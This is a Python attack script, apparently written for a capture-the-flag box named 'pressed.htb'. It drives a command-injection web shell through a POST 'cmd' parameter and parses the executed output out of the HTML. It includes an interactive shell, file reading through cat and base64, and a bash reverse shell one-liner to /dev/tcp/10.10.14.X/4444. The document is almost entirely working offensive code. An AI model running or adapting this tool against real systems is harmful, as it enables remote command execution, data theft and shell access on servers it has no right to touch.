#!/usr/bin/python3
import requests
import re
import time

class ReflectedShell:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        
        # Test to understand the reflection pattern
        test_cmd = "echo REFLECTION_TEST_ABCD"
        response = self.execute_command(test_cmd)
        
        # Try to find the pattern
        if 'REFLECTION_TEST_ABCD' in response:
            print("[+] Command injection confirmed!")
            
            # Extract context around the reflection
            idx = response.find('REFLECTION_TEST_ABCD')
            context_start = max(0, idx - 500)
            context_end = min(len(response), idx + 500)
            context = response[context_start:context_end]
            
            print(f"[*] Reflection context:")
            print("="*60)
            print(context)
            print("="*60)
            
            # Try to extract pattern
            lines = response.split('\n')
            for i, line in enumerate(lines):
                if 'REFLECTION_TEST_ABCD' in line:
                    print(f"\n[*] Found on line {i}:")
                    print(f"    {line.strip()}")
                    
                    # Check previous lines for table structure
                    for j in range(max(0, i-5), min(len(lines), i+5)):
                        if '<table' in lines[j] or '<tr>' in lines[j] or '<td>' in lines[j]:
                            print(f"    Line {j}: {lines[j].strip()}")
        else:
            print("[-] Command injection not working as expected")

    def execute_command(self, cmd):
        """Execute command and return full response"""
        data = {'cmd': cmd}
        try:
            r = self.session.post(self.url, data=data, timeout=10, verify=False)
            return r.text
        except Exception as e:
            print(f"[-] Error: {e}")
            return ""

    def extract_output(self, response, cmd):
        """Extract command output from HTML response"""
        # First, let's find where our command output appears
        # We'll look for the command itself or patterns around it
        
        # Try to find table with our output
        lines = response.split('\n')
        
        # Method 1: Look for lines after table headers
        in_table = False
        table_data = []
        
        for i, line in enumerate(lines):
            if '<table' in line:
                in_table = True
            elif '</table>' in line:
                in_table = False
            elif in_table and '<tr>' in line:
                # Start of table row
                pass
            elif in_table and '<td>' in line:
                # Extract table cell content
                cell_content = re.sub('<[^>]+>', '', line).strip()
                if cell_content:
                    table_data.append(cell_content)
        
        # Method 2: Look for our specific output pattern
        # The output appears to be directly in the HTML
        output_lines = []
        for line in lines:
            clean_line = re.sub('<[^>]+>', '', line).strip()
            if clean_line and not clean_line.startswith(('{', '[', '/*', '*/', '!DOCTYPE')):
                # Check if this looks like command output (not HTML/JS/CSS)
                if len(clean_line) < 1000 and not 'function' in clean_line and not 'var ' in clean_line:
                    output_lines.append(clean_line)
        
        # Method 3: Try to get everything between certain markers
        # Based on the context we saw earlier
        pattern = r'</table>\s*(.*?)\s*<p></p>'
        matches = re.findall(pattern, response, re.DOTALL)
        
        if matches:
            print(f"[*] Found output between table and paragraph tags")
            return matches[0].strip()
        
        # If nothing specific found, return the last few non-HTML lines
        return '\n'.join(output_lines[-10:]) if output_lines else "No output extracted"

    def run_command(self, cmd):
        """Run command and print extracted output"""
        print(f"[>] Executing: {cmd}")
        response = self.execute_command(cmd)
        
        output = self.extract_output(response, cmd)
        if output:
            print("[+] Output:")
            print("-" * 40)
            print(output)
            print("-" * 40)
        else:
            print("[-] No output extracted")
            # Save response for debugging
            with open(f"/tmp/debug_response.html", "w") as f:
                f.write(response[:5000])
            print(f"[*] Saved response snippet to /tmp/debug_response.html")

def test_reflection_pattern():
    """Test to understand exactly how output is reflected"""
    url = "http://pressed.htb/index.php/2022/01/28/hello-world/"
    
    # Test different commands to see pattern
    test_commands = [
        "whoami",
        "id",
        "pwd",
        "ls -la",
        "echo 'USER:$USER'",
        "echo 'PATH:$PATH'",
        "uname -a",
    ]
    
    shell = ReflectedShell(url)
    
    for cmd in test_commands:
        print(f"\n{'='*60}")
        print(f"Testing: {cmd}")
        print(f"{'='*60}")
        shell.run_command(cmd)
        time.sleep(1)  # Avoid overwhelming

def interactive_shell():
    """Start an interactive shell"""
    url = "http://pressed.htb/index.php/2022/01/28/hello-world/"
    shell = ReflectedShell(url)
    
    print("\n" + "="*60)
    print("Interactive Reflected Shell")
    print("="*60)
    print("Type 'exit' to quit, 'help' for commands")
    
    while True:
        try:
            cmd = input("\nshell> ").strip()
            
            if cmd.lower() in ['exit', 'quit']:
                break
            elif cmd.lower() == 'help':
                print("\nAvailable commands:")
                print("  exit/quit - Exit shell")
                print("  help - Show this help")
                print("  get <file> - Download file (base64 encoded)")
                print("  upload <local> <remote> - Upload file (base64)")
                print("  shell - Try to get reverse shell")
                print("  Any system command")
                continue
            elif cmd.startswith('get '):
                # Download file
                filename = cmd[4:].strip()
                download_cmd = f"cat {filename} | base64"
                shell.run_command(download_cmd)
            elif cmd.startswith('upload '):
                # Upload file - would need local file handling
                parts = cmd[7:].split()
                if len(parts) == 2:
                    local, remote = parts
                    print(f"[*] Upload not implemented. Use: base64 -d > {remote}")
                else:
                    print("[-] Usage: upload <local_file> <remote_path>")
            elif cmd == 'shell':
                print("[*] Attempting reverse shell...")
                # You'll need to replace IP/PORT
                reverse_shell = "bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"
                shell.run_command(reverse_shell)
                print("[*] Check your listener on port 4444")
            else:
                shell.run_command(cmd)
                
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    # First test the reflection pattern
    test_reflection_pattern()
    
    # Then start interactive shell
    print("\n" + "="*60)
    response = input("Start interactive shell? (y/n): ")
    if response.lower() == 'y':
        interactive_shell()